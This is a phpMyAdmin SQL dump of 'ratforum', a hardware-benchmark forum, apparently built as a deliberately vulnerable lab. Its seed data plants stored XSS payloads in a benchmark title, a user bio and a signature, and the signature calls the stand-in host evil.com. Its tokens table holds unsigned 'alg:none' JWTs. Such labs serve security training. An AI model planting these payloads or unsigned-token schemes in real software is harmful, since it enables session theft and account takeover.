-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Gegenereerd op: 17 jul 2025 om 00:04
-- Serverversie: 10.4.28-MariaDB
-- PHP-versie: 8.2.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `ratforum`
--
CREATE DATABASE IF NOT EXISTS ratforum;
USE ratforum;
-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `benchmarks`
--

CREATE TABLE `benchmarks` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `benchmark_title` varchar(100) DEFAULT NULL,
  `cpu_score` int(11) DEFAULT NULL,
  `gpu_score` int(11) DEFAULT NULL,
  `fps_score` int(11) DEFAULT NULL,
  `created_at` datetime DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Gegevens worden geëxporteerd voor tabel `benchmarks`
--

INSERT INTO `benchmarks` (`id`, `user_id`, `benchmark_title`, `cpu_score`, `gpu_score`, `fps_score`, `created_at`) VALUES
(1, 2, 'Cyberpunk 2077 - Max Settings', 23000, 51000, 142, '2025-07-16 23:37:22'),
(2, 3, '<script>alert(\"XSS\")</script>', 18000, 40000, 120, '2025-07-16 23:37:22'),
(3, 4, '<img src=x>', 211, 12, 213, '2025-07-16 23:48:23');

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `title` varchar(100) DEFAULT NULL,
  `content` text NOT NULL,
  `created_at` datetime DEFAULT current_timestamp(),
  `parent_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Gegevens worden geëxporteerd voor tabel `posts`
--

INSERT INTO `posts` (`id`, `user_id`, `title`, `content`, `created_at`, `parent_id`) VALUES
(1, 2, 'What games are you benchmarking?', 'I just tested Cyberpunk 2077 with full ray tracing. Insane performance!', '2025-07-16 23:37:22', NULL),
(2, 3, 'New build complete!', 'Just finished assembling my monster rig. AMA.', '2025-07-16 23:37:22', NULL),
(3, 2, NULL, 'That build is nuts! Post some benchmarks please.', '2025-07-16 23:37:22', 2),
(4, 1, NULL, 'Welcome to RatForum. Please behave.', '2025-07-16 23:37:22', 1),
(5, 4, NULL, 'kjh', '2025-07-16 23:43:20', 1),
(6, 4, 'ffgdgdf', 'fdgdfgweds', '2025-07-16 23:47:06', NULL),
(7, 4, 'cdsfs', 'vcbcb', '2025-07-16 23:47:17', 6);

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `tokens`
--

CREATE TABLE `tokens` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `token` text NOT NULL,
  `issued_at` datetime DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Gegevens worden geëxporteerd voor tabel `tokens`
--

INSERT INTO `tokens` (`id`, `user_id`, `token`, `issued_at`) VALUES
(1, 1, 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', '2025-07-16 23:37:22'),
(2, 2, 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXNzYXJhdC1yYXR1c2VyMSJ9.', '2025-07-16 23:37:22');

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password_hash` varchar(255) NOT NULL,
  `is_admin` tinyint(1) DEFAULT 0,
  `showcase_cpu` varchar(100) DEFAULT NULL,
  `showcase_gpu` varchar(100) DEFAULT NULL,
  `showcase_ram` varchar(100) DEFAULT NULL,
  `showcase_storage` varchar(100) DEFAULT NULL,
  `showcase_cooling` varchar(100) DEFAULT NULL,
  `showcase_psu` varchar(100) DEFAULT NULL,
  `bio` text DEFAULT NULL,
  `signature` text DEFAULT NULL,
  `showcase_image` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Gegevens worden geëxporteerd voor tabel `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password_hash`, `is_admin`, `showcase_cpu`, `showcase_gpu`, `showcase_ram`, `showcase_storage`, `showcase_cooling`, `showcase_psu`, `bio`, `signature`, `showcase_image`) VALUES
(1, 'admin', 'admin@ratforum.local', '$2y$10$adminhashhere', 1, NULL, NULL, NULL, NULL, NULL, NULL, 'I am the admin.', 'AdminSig', NULL),
(2, 'ratuser1', 'user1@ratforum.local', '$2y$10$user1hash', 0, 'Intel i9-12900K', 'NVIDIA RTX 4090', '32GB DDR5', '2TB NVMe', 'Corsair Liquid', '1000W Platinum', 'Gaming enthusiast.', 'Stay ratty!', NULL),
(3, 'ratuser2', 'user2@ratforum.local', '$2y$10$user2hash', 0, 'AMD Ryzen 5800X3D', 'AMD RX 7900XTX', '64GB DDR4', '1TB SSD', 'Air Cooler', '850W Gold', '<script>alert(\"bioXSS\")</script>', '<img src=x onerror=fetch(\"https://evil.com/xss\")>', NULL),
(4, 'test', 'thexssrat@gmail.com', '$2y$10$lLVYSVPK2wqdYoDziRO8Cu/RSzNl5.3Jih.W6PgJf9qsYEdL4ema2', 0, 'frd', 'dfg', 'fdg', 'fgd', 'fdg', 'fg', NULL, NULL, NULL);

--
-- Indexen voor geëxporteerde tabellen
--

--
-- Indexen voor tabel `benchmarks`
--
ALTER TABLE `benchmarks`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexen voor tabel `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `parent_id` (`parent_id`);

--
-- Indexen voor tabel `tokens`
--
ALTER TABLE `tokens`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexen voor tabel `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD UNIQUE KEY `email` (`email`);

--
-- AUTO_INCREMENT voor geëxporteerde tabellen
--

--
-- AUTO_INCREMENT voor een tabel `benchmarks`
--
ALTER TABLE `benchmarks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT voor een tabel `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT voor een tabel `tokens`
--
ALTER TABLE `tokens`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT voor een tabel `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- Beperkingen voor geëxporteerde tabellen
--

--
-- Beperkingen voor tabel `benchmarks`
--
ALTER TABLE `benchmarks`
  ADD CONSTRAINT `benchmarks_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`);

--
-- Beperkingen voor tabel `posts`
--
ALTER TABLE `posts`
  ADD CONSTRAINT `posts_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  ADD CONSTRAINT `posts_ibfk_2` FOREIGN KEY (`parent_id`) REFERENCES `posts` (`id`) ON DELETE CASCADE;

--
-- Beperkingen voor tabel `tokens`
--
ALTER TABLE `tokens`
  ADD CONSTRAINT `tokens_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
